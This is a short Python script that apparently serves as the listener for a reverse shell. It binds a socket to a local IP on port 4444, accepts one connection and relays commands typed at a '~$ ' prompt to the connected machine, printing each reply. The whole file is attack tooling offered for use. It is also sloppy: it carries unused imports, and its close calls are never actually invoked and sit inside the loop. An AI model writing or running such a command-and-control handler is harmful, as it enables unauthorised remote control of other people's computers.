from operator import truediv
import socket
from sqlite3 import connect

s=socket.socket()

s.bind(("192.168.182.46",4444)) #your ip

s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

s.listen(1)

client,addr=s.accept()

print('connected')




while True:

  cmd=input("~$ ")

  client.send (cmd .encode())

  if cmd=="q":
    break
  recv=client.recv((1024)).decode()

  print(recv)

  client.close
  s.close
